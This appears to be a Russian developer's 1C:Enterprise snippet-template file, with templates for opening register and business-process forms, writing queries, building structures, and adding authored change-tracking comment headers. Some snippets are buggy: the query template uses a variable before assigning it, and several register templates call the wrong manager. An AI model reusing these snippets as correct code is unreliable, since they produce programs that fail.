{"Получить форму плана счетов (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""ПланСчетов.<?""Выберите план счетов"", ПланСчетов>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Найти по коду",0,0,"","ПланыСчетов.<?"""", ПланСчетов>.НайтиПоКоду(<?>)"}
}
},
{5,
{"Планы видов расчета",1,0,"",""},
{0,
{"Открыть форму плана видов расчета",0,0,"Открыть[Форму]","ОткрытьФорму(""ПланВидовРасчета.<?""Выберите план видов расчета"", ПланВидовРасчета>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму плана видов расчета (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""ПланВидовРасчета.<?""Выберите план видов расчета"", ПланВидовРасчета>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму плана видов расчета",0,0,"Получить[Форму]","ПолучитьФорму(""ПланВидовРасчета.<?""Выберите план видов расчета"", ПланВидовРасчета>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму плана видов расчета (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""ПланВидовРасчета.<?""Выберите план видов расчета"", ПланВидовРасчета>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Обход видов расчета",0,0,"","Выборка = ПланыВидовРасчета.<?"""", ПланВидовРасчета>.Выбрать();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
}
},
{5,
{"Бизнес-процессы",1,0,"",""},
{0,
{"Открыть форму бизнес-процесса",0,0,"Открыть[Форму]","ОткрытьФорму(""БизнесПроцесс.<?""Выберите бизнес-процесс"", БизнесПроцесс>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму бизнес-процесса (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""БизнесПроцесс.<?""Выберите бизнес-процесс"", БизнесПроцесс>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму бизнес-процесса",0,0,"Получить[Форму]","ПолучитьФорму(""БизнесПроцесс.<?""Выберите бизнес-процесс"", БизнесПроцесс>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму бизнес-процесса (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""БизнесПроцесс.<?""Выберите бизнес-процесс"", БизнесПроцесс>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Обход бизнес-процессов",0,0,"","Выборка = БизнесПроцессы.<?"""", БизнесПроцесс>.Выбрать();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
}
},
{4,
{"Задачи",1,0,"",""},
{0,
{"Открыть форму задачи",0,0,"Открыть[Форму]","ОткрытьФорму(""Задача.<?""Выберите задачу"", Задача>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму задачи (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""Задача.<?""Выберите задачу"", Задача>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму задачи",0,0,"Получить[Форму]","ПолучитьФорму(""Задача.<?""Выберите задачу"", Задача>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму задачи (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""Задача.<?""Выберите задачу"", Задача>.<?""Выберите форму"", ВыборВарианта, ""Объекта"", ""ФормаОбъекта"", ""Списка"", ""ФормаСписка"", ""Выбора"", ""ФормаВыбора"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
}
},
{6,
{"Регистры сведений",1,0,"",""},
{0,
{"Открыть форму регистра сведений",0,0,"Открыть[Форму]","ОткрытьФорму(""РегистрСведений.<?""Выберите регистр сведений"", РегистрСведений>.<?""Выберите форму"", ВыборВарианта, ""Записи"", ""ФормаЗаписи"", ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму регистра сведений (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""РегистрСведений.<?""Выберите регистр сведений"", РегистрСведений>.<?""Выберите форму"", ВыборВарианта, ""Записи"", ""ФормаЗаписи"", ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму регистра сведений",0,0,"Получить[Форму]","ПолучитьФорму(""РегистрСведений.<?""Выберите регистр сведений"", РегистрСведений>.<?""Выберите форму"", ВыборВарианта, ""Записи"", ""ФормаЗаписи"", ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму регистра сведений (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""РегистрСведений.<?""Выберите регистр сведений"", РегистрСведений>.<?""Выберите форму"", ВыборВарианта, ""Записи"", ""ФормаЗаписи"", ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Выборка записей регистра сведений",0,0,"","Выборка = РегистрСведений.<?""Выберите регистр сведений"", РегистрСведений>.Выбрать();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
},
{0,
{"Выборка записей регистра сведений (по регистратору)",0,0,"","Выборка = РегистрСведений.<?""Выберите регистр сведений"", РегистрСведений>.ВыбратьПоРегистратору(<?>);

Пока Выборка.Следующий() Цикл


КонецЦикла;"}
}
},
{6,
{"Регистры накопления",1,0,"",""},
{0,
{"Открыть форму регистра накопления",0,0,"Открыть[Форму]","ОткрытьФорму(""РегистрНакопления.<?""Выберите регистр накопления"", РегистрНакопления>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму регистра накопления (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""РегистрНакопления.<?""Выберите регистр накопления"", РегистрНакопления>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму регистра накопления",0,0,"Получить[Форму]","ПолучитьФорму(""РегистрНакопления.<?""Выберите регистр накопления"", РегистрНакопления>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму регистра накопления (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""РегистрНакопления.<?""Выберите регистр накопления"", РегистрНакопления>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Выборка записей регистра накопления",0,0,"","Выборка = РегистрСведений.<?""Выберите регистр накопления"", РегистрНакопления>.Выбрать();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
},
{0,
{"Выборка записей регистра накопления (по регистратору)",0,0,"","Выборка = РегистрСведений.<?""Выберите регистр накопления"", РегистрНакопления>.ВыбратьПоРегистратору(<?>);

Пока Выборка.Следующий() Цикл


КонецЦикла;"}
}
},
{6,
{"Регистры бухгалтерии",1,0,"",""},
{0,
{"Открыть форму регистра бухгалтерии",0,0,"Открыть[Форму]","ОткрытьФорму(""РегистрБухгалтерии.<?""Выберите регистр бухгалтерии"", РегистрБухгалтерии>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму регистра бухгалтерии (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""РегистрБухгалтерии.<?""Выберите регистр бухгалтерии"", РегистрБухгалтерии>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму регистра бухгалтерии",0,0,"Получить[Форму]","ПолучитьФорму(""РегистрБухгалтерии.<?""Выберите регистр бухгалтерии"", РегистрБухгалтерии>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму регистра бухгалтерии (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""РегистрБухгалтерии.<?""Выберите регистр бухгалтерии"", РегистрБухгалтерии>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Выборка записей регистра бухгалтерии",0,0,"","Выборка = РегистрСведений.<?""Выберите регистр бухгалтерии"", РегистрБухгалтерии>.Выбрать();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
},
{0,
{"Выборка записей регистра бухгалтерии (по регистратору)",0,0,"","Выборка = РегистрСведений.<?""Выберите регистр бухгалтерии"", РегистрБухгалтерии>.ВыбратьПоРегистратору(<?>);

Пока Выборка.Следующий() Цикл


КонецЦикла;"}
}
},
{6,
{"Регистры расчета",1,0,"",""},
{0,
{"Открыть форму регистра расчета",0,0,"Открыть[Форму]","ОткрытьФорму(""РегистрРасчета.<?""Выберите регистр расчета"", РегистрРасчета>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Открыть форму регистра расчета (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
ОткрытьФорму(""РегистрРасчета.<?""Выберите регистр расчета"", РегистрРасчета>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);"}
},
{0,
{"Получить форму регистра расчета",0,0,"Получить[Форму]","ПолучитьФорму(""РегистрРасчета.<?""Выберите регистр расчета"", РегистрРасчета>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма.""><?>"");"}
},
{0,
{"Получить форму регистра расчета (с параметрами)",0,0,"","ПараметрыФормы = Новый Структура;
ПараметрыФормы.Вставить(""<?>"", );
Форма = ПолучитьФорму(""РегистрРасчета.<?""Выберите регистр расчета"", РегистрРасчета>.<?""Выберите форму"", ВыборВарианта, ""Списка"", ""ФормаСписка"", ""Произвольная"", ""Форма."">"", ПараметрыФормы);
"}
},
{0,
{"Выборка записей регистра расчета",0,0,"","Выборка = РегистрСведений.<?""Выберите регистр расчета"", РегистрРасчета>.Выбрать();

Пока Выборка.Следующий() Цикл

	<?>

КонецЦикла;"}
},
{0,
{"Выборка записей регистра расчета (по регистратору)",0,0,"","Выборка = РегистрСведений.<?""Выберите регистр расчета"", РегистрРасчета>.ВыбратьПоРегистратору(<?>);

Пока Выборка.Следующий() Цикл


КонецЦикла;"}
}
}
},
{18,
{"Прочие",1,0,"",""},
{0,
{"Сообщение",0,1,"Сообщ[ение]","лСообщение 			= Новый СообщениеПользователю;
лСообщение.Текст 	= ""<?>"";
лСообщение.Поле 	= """";
лСообщение.УстановитьДанные();
лСообщение.Сообщить();"}
},
{0,
{"Предупреждение",0,0,"Предупр[еждение]","Предупреждение(<?>);"}
},
{0,
{"Формат",0,0,"Формат","Формат(<?>, ""<?, ФорматнаяСтрока>"")"}
},
{0,
{"Форматная строка",0,1,"","""<?, ФорматнаяСтрока>"""}
},
{0,
{"Создать структуру",0,0,"Струк[тура]","Новый Структура(""<?>"", )"}
},
{0,
{"Создать структуру вертикально",0,0,"СтрукВерт[икал]","Новый Структура(
		""""
	,			
)"}
},
{0,
{"Создать структуру со вставкой 1",0,0,"СтрукВст[ав]","<?""Имя структуры (слитно)""> 	= Новый Структура;
<?""Имя структуры (слитно)"">.Вставить(""<?>""	, );"}
},
{0,
{"Создать структуру со вставкой 3",0,0,"СтрукВст3","<?""Имя структуры (слитно)""> 	= Новый Структура;
<?""Имя структуры (слитно)"">.Вставить(""<?>""	, );
<?""Имя структуры (слитно)"">.Вставить(""""	, );
<?""Имя структуры (слитно)"">.Вставить(""""	, );"}
},
{0,
{"Создать структуру со вставкой 5",0,0,"СтрукВст5","<?""Имя структуры (слитно)""> 	= Новый Структура;
<?""Имя структуры (слитно)"">.Вставить(""<?>""	, );
<?""Имя структуры (слитно)"">.Вставить(""""	, );
<?""Имя структуры (слитно)"">.Вставить(""""	, );
<?""Имя структуры (слитно)"">.Вставить(""""	, );
<?""Имя структуры (слитно)"">.Вставить(""""	, );"}
},
{0,
{"Запрос",0,0,"Зап[рос]","Запрос 			= Новый Запрос;
Запрос.Текст 	= ""<?"""", ТекстЗапроса>"";

лРезультатЗапроса 	= Запрос.Выполнить();

Если НЕ лРезультатЗапроса.Пустой() Тогда
	Пока лВыборка.Следующий() Цикл
		лВыборка 	= лРезультат.Выбрать();
		<?>
		Прервать;	
	КонецЦикла;
КонецЕсли;
"}
},
{0,
{"Запрос с параметром",0,0,"ЗСП[арам]","Запрос 			= Новый Запрос;
Запрос.Текст 	= """";

Запрос.УстановитьПараметр("""", );

РезультатЗапроса 	= Запрос.Выполнить();

Если НЕ РезультатЗапроса.Пустой() Тогда
	Выборка 	= РезультатЗапроса.Выбрать();
	Пока Выборка.Следующий() Цикл
		<?>
		Прервать;	
	КонецЦикла;
КонецЕсли;"}
},
{0,
{"Запрос.УстановитьПараметр",0,0,"ЗУП[арам]","Запрос.УстановитьПараметр(""<?>""	, );"}
},
{0,
{"Запрос Выполнить",0,0,"ЗапВып[олн]","РезультатЗапроса 	= Запрос.Выполнить();

Если НЕ РезультатЗапроса.Пустой() Тогда
	Выборка 	= РезультатЗапроса.Выбрать();
	Пока Выборка.Следующий() Цикл
		<?>
		Прервать;	
	КонецЦикла;
КонецЕсли;"}
},
{0,
{"Вопрос",0,0,"Вопр[ос]","Вопрос(""<?""Текст вопроса"">"", <?""Режим диалога вопрос"", ВыборВарианта, ""ДаНет"", ""РежимДиалогаВопрос.ДаНет"", ""ДаНетОтмена"", ""РежимДиалогаВопрос.ДаНетОтмена"", ""ОК"", ""РежимДиалогаВопрос.ОК"", ""ОКОтмена"", ""РежимДиалогаВопрос.ОКОтмена"", ""ПовторитьОтмена"", ""РежимДиалогаВопрос.ПовторитьОтмена"", ""ПрерватьПовторитьПропустить"", ""РежимДиалогаВопрос.ПрерватьПовторитьПропустить"">)"}
},
{0,
{"Вопрос с анализом результата",0,0,"Вопр[ос]","Вопрос(""<?""Текст вопроса"">"", <?""Режим диалога вопрос"", ВыборВарианта, ""ДаНет"", ""РежимДиалогаВопрос.ДаНет"", ""ДаНетОтмена"", ""РежимДиалогаВопрос.ДаНетОтмена"", ""ОК"", ""РежимДиалогаВопрос.ОК"", ""ОКОтмена"", ""РежимДиалогаВопрос.ОКОтмена"", ""ПовторитьОтмена"", ""РежимДиалогаВопрос.ПовторитьОтмена"", ""ПрерватьПовторитьПропустить"", ""РежимДиалогаВопрос.ПрерватьПовторитьПропустить"">) = <?""Код возврата диалога"", ВыборВарианта, ""Да"", ""КодВозвратаДиалога.Да"", ""Нет"", ""КодВозвратаДиалога.Нет"", ""ОК"", ""КодВозвратаДиалога.ОК"", ""Отмена"", ""КодВозвратаДиалога.Отмена"", ""Повторить"", ""КодВозвратаДиалога.Повторить"", ""Прервать"", ""КодВозвратаДиалога.Прервать"", ""Пропустить"", ""КодВозвратаДиалога.Пропустить"", ""Таймаут"", ""КодВозвратаДиалога.Таймаут"">"}
},
{0,
{"Проверка типа",0,0,"","Если ТипЗнч(<?""Выражение для проверки типа"">) = Тип(""<?""Выберите тип"", ВыборТипа>"") Тогда

	<?>

КонецЕсли;"}
},
{0,
{"КонструкторОписанияТипов",0,0,"","<?""Конструктор описания типов"", КонструкторОписанияТипов>"}
},
{0,
{"УникальныйИдентификатор",0,0,"УИ","УникальныйИдентификатор()"}
}
}
},
{30,
{"Комментарий",1,0,"",""},
{4,
{"Автор",1,0,"",""},
{0,
{"Автор",0,0,"/авт","// АйТи КучеровРМ"}
},
{0,
{"Автор, дата",0,0,"/автД[ат]","// АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">"}
},
{0,
{"Автор, дата, ТЗ (пояснение, комментарий)",0,0,"/автК[оомент]","// АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Автор процедур и функций (методов)",0,0,"/автМ","// автор: КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">"}
}
},
{29,
{"Шапки и заголовки кода, разделители",1,0,"",""},
{0,
{"Шапка без тире",0,0,"/шапка","////////////////////////////////////////////////////////////////////////////////
// <?""Название"">
//
////////////////////////////////////////////////////////////////////////////////
<?>"}
},
{0,
{"Шапка без тире с автором",0,0,"/шапкаА[втор]","////////////////////////////////////////////////////////////////////////////////
// [ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> ]
// <?""Название""> 
////////////////////////////////////////////////////////////////////////////////
<?>
"}
},
{0,
{"Шапка фирменная",0,0,"/шапкаФ[ирма]","////////////////////////////////////////////////////////////////////////////////
// Влюбленная в свое дело команда ООО «АйТи-Консалтинг»,
// г. Ярославль, ул. Советская, д.69, к.2, этаж 1,
// тел. (4852) 59-33-33, info@allzon.ru,
// https://itcons99.ru/, http://itcons76.ru/
////////////////////////////////////////////////////////////////////////////////
<?>"}
},
{0,
{"Шапка с тире",0,0,"шапка [с тире]","////////////////////////////////////////////////////////////////////////////////
// --------------------------------------- <?""Название""> -------------------------------------
////////////////////////////////////////////////////////////////////////////////
<?>"}
},
{0,
{"Шапка из =",0,0,"","// ============================================================================//.
// <?""Название"">
// ============================================================================//.
<?>"}
},
{0,
{"Шапка мини",0,0,"","///
// <?""Название""> 
///
<?>"}
},
{0,
{"Шапки в паре",0,0,"","////////////////////////////////////////////////////////////////////////////////
// +++----------- <?""Название""> --------------

<?>

// --------------- <?""Название""> ----------+++
////////////////////////////////////////////////////////////////////////////////"}
},
{0,
{"Заголовок в паре",0,0,"/загПа[ра]","////////////////////////////////////////////////////////////////////////////////
// +++ <?""Название""> 

<?>

// --- <?""Название""> 
////////////////////////////////////////////////////////////////////////////////"}
},
{0,
{"Заголовок в паре с автором",0,0,"/загПа[ра]","////////////////////////////////////////////////////////////////////////////////
// +++ <?""Название""> [ АйТи КучеровРМ ]

<?>

// --- <?""Название""> [ АйТи КучеровРМ ]
////////////////////////////////////////////////////////////////////////////////"}
},
{0,
{"Заголовок в паре с автором, дата, ТЗ",0,0,"/загПа[ра]","////////////////////////////////////////////////////////////////////////////////
// +++ <?""Название""> [ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> ]

<?>

// --- <?""Название""> [ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ # <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)""> ]
////////////////////////////////////////////////////////////////////////////////"}
},
{0,
{"Заголовок с //",0,0,"/заг","////////////////////////////////////////////////////////////////////////////////
// <?""Название"">"}
},
{0,
{"Заголовок с ::::::",0,0,"/заг","// ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
// <?""Название"">"}
},
{0,
{"Заголовок блока текста (:::)",0,0,"/:","//:::<?>"}
},
{0,
{"Заголовок процедуры",0,0,"/загП[роцедура]","//Процедура <?>
//-------------------------------------------------------------------------
//Параметры:
//		Параметр 	- Тип 	- описание
//-------------------------------------------------------------------------
//автор: КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">"}
},
{0,
{"Заголовок функции",0,0,"/загФ[ункция]","//Функция <?>
//-------------------------------------------------------------------------
//Параметры:
//		Параметр 	- Тип 	- описание
//Возвращаемое значение:
//		Тип 	- описание
//-------------------------------------------------------------------------
//автор: КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy"">"}
},
{0,
{"Комментарий для функции",0,0,"/загК[омментарий]","//-------------------------------------------------------------------------
//<?""Текст комментария""><?>
//-------------------------------------------------------------------------"}
},
{0,
{"Разделитель",0,0,"/раз","//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////"}
},
{0,
{"Разделитель с названием",0,0,"/разН[азв]","//  <?""Название"">  //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////"}
},
{0,
{"Параметр процедур и функций",0,0,"/п","//		Параметр 	- Тип 	- описание"}
},
{0,
{"Параметр процедур и функций - Строка ",0,0,"/пС","//		Параметр 	- Строка 	- описание"}
},
{0,
{"Параметр процедур и функций - Число",0,0,"/пЧ","//		Параметр 	- Число 	- описание"}
},
{0,
{"Параметр процедур и функций - Булево",0,0,"/пБ","//		Параметр 	- Булево 	- описание"}
},
{0,
{"Параметр процедур и функций - Дата",0,0,"/пД","//		Параметр 	- Дата 	- описание"}
},
{0,
{"Параметр процедур и функций - Структура",0,0,"/пСт","//		Параметр 	- Структура 	- описание"}
},
{0,
{"Параметр процедур и функций - ТаблицаЗначений",0,0,"/пТЗ","//		Параметр 	- ТаблицаЗначений 	- описание"}
},
{0,
{"Параметр процедур и функций - ДокументСсылка",0,0,"/пДС","//		Параметр 	- ДокументСсылка 	- описание"}
},
{0,
{"Параметр процедур и функций - ДокументОбъект",0,0,"/пДО","//		Параметр 	- ДокументОбъект 	- описание"}
},
{0,
{"ПодПараметр процедур и функций",0,0,"/пп","//					* Параметр 	- Тип 	- описание"}
},
{0,
{"Подпараметр параметра",0,0,"/	","//			<?>"}
}
},
{2,
{"Чужие комментарии (по проектам)",1,0,"",""},
{0,
{"Норд",0,0,"/комНорд[Стар]","//Нордстар+, <?"""", ДатаВремя, ""ДФ=yyyy-MM-dd"">, ЕфимоваД, Омега, <?""ID заявки "">, <?""№"">
<?>
//Нордстар-
"}
},
{0,
{"Компсистемс",0,0,"/комКомпС[истемс]","//+++ Компсистемс КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ № <?""№"">
<?>
//--- Компсистемс КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> ТЗ № <?""№"">"}
}
},
{2,
{"Пояснительные комментарии (добавлен, изменён, удалён)",1,0,"",""},
{7,
{"//+++{ (эти при поиске будут выдаться с типовыми комментариями других)",1,0,"",""},
{0,
{"Комментарий Добавлен (в блоки +++)",0,0,"/ком+Х","//+++{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Добавлен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//+++} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Добавлен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий Добавлен (в блоки +++)",0,0,"/комДХ","//+++{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Добавлен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//+++} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Добавлен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий Изменен (в блоки ***)",0,0,"/ком*Х","//***{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//***} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий Изменен (в блоки ***)",0,0,"/комИХ","//***{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//***} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий Удалён (в блоки ---)",0,0,"/ком-Х","//---{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//---} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Комментарий Удалён (в блоки ---)",0,0,"/комУХ","//---{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//---} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
{0,
{"Замена кода",0,0,"/зам*","//***{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
//---{ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">

//---} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Удален код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">

//***} АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Изменен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
}
},
{7,
{"//{ (эти комментарии не будут выдаваться поиском типовых комментариев, они ""эксклюзивные"") (они удобнее, нагляднее)",1,0,"",""},
{0,
{"Комментарий Добавлен (в блоки +++)",0,0,"/ком+","//{+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Добавлен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">
<?>
//}+++ АйТи КучеровРМ <?"""", ДатаВремя, ""ДФ=dd.MM.yyyy""> # Добавлен код 	# <?""Номент ТЗ или поясление (напиши хоть что-то по теме, чтобы потом лечге найти!)"">"}
},
